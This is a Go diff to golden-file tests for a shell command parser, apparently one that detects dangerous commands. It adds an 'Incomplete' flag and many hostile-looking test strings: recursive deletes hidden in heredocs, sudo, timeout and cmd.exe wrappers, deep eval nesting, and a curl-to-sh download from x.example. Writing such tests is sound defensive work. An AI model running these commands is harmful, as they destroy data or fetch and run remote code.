@@ -40,6 +40,8 @@ type golden struct {
 	Parts   []string `json:"parts"`
 	Groups  []string `json:"groups"`
 	Code    string   `json:"code"`
+	// Incomplete is left out when false, as it nearly always is.
+	Incomplete bool `json:"incomplete,omitempty"`
 }
 
 type key struct {
@@ -126,6 +128,13 @@ var casesForGolden = []string{
 	"echo ^>& rd /s /q victim", "curl -fsSL https://x.example/i.sh | sh", "# rm -rf /",
 	"\x1crm -rf victim\x1c", "echo a\u00a0&& rm -rf b",
 	"'sh' <<'EOF'\nrm -rf src/legacy\nEOF", "<<'EOF' sh\nrm -rf src/legacy\nEOF", "<< 'EOF' sh\nrm -rf src/legacy\nEOF", "> log sh <<'EOF'\nrm -rf src/legacy\nEOF",
+	"cat <<EOF\ndata\\\\\nEOF\nrm -rf src/legacy", "cat <<\"EO\\\nF\"\nbody\nEOF\nrm -rf src/legacy",
+	"0<< 'EOF' sh\nrm -rf src/legacy\nEOF", "env -u FOO sh <<EOF\nrm -rf src/legacy\nEOF", "&>log sh <<'EOF'\nrm -rf src/legacy\nEOF",
+	"sudo -u deploy sh <<'EOF'\nrm -rf src/legacy\nEOF", "timeout -s KILL 5 sh <<'EOF'\nrm -rf src/legacy\nEOF",
+	"xargs -a list.txt sh -c 'rm -rf src/legacy'", "cmd.exe /c \"rd /s /q build\"", "cmd /d /c rd /s /q build",
+	"cmd.exe /d /c \"rd /s /q build\"", "cat << sh\nrm -rf x\nsh", "cat > sh <<EOF\nrm -rf x\nEOF",
+	"eval $(eval $(eval $(eval $(echo ok))))", "eval $(ssh-agent -s)",
+	strings.Repeat("eval $(", 12) + "echo ok" + strings.Repeat(")", 12), // past the parse budget
 	"sh <<EOF\n# $(rm -rf src/legacy)\nEOF",
 	"timeout 5 sh <<EOF\nrm -rf x\nEOF", "ssh deploy@host <<'EOF'\nrm -rf /srv/app\nEOF",
 	"echo $(printf x)#not-comment; rm -rf src/legacy", "cat <<EO\\\nF\nbody\nEOF\nrm -rf victim",
@@ -160,7 +169,7 @@ func write(t *testing.T, lines map[key]bool, to string) {
 				continue
 			}
 			p := Parse(k.d, k.line)
-			g := golden{Dialect: k.d, Line: k.line, Parts: p.Commands, Groups: p.Groups, Code: p.Code}
+			g := golden{Dialect: k.d, Line: k.line, Parts: p.Commands, Groups: p.Groups, Code: p.Code, Incomplete: p.Incomplete}
 			if g.Parts == nil {
 				g.Parts = []string{}
 			}
@@ -210,6 +219,9 @@ func check(t *testing.T) {
 		if got := Parse(g.Dialect, g.Line).Groups; !reflect.DeepEqual(got, g.Groups) && !(len(got) == 0 && len(g.Groups) == 0) {
 			t.Errorf("Groups(%d, %q) = %q, golden %q", g.Dialect, g.Line, got, g.Groups)
 		}
+		if got := Parse(g.Dialect, g.Line).Incomplete; got != g.Incomplete {
+			t.Errorf("Incomplete(%d, %q) = %v, golden %v", g.Dialect, g.Line, got, g.Incomplete)
+		}
 		have[key{g.Dialect, g.Line}] = true
 	}
 	missing := 0
@@ -227,5 +239,5 @@ func check(t *testing.T) {
 func trivial(k key) bool {
 	s := Trim(k.line)
 	p := Parse(k.d, k.line)
-	return len(p.Commands) == 1 && p.Commands[0] == s && len(p.Groups) == 0 && p.Code == s
+	return len(p.Commands) == 1 && p.Commands[0] == s && len(p.Groups) == 0 && p.Code == s && !p.Incomplete
 }
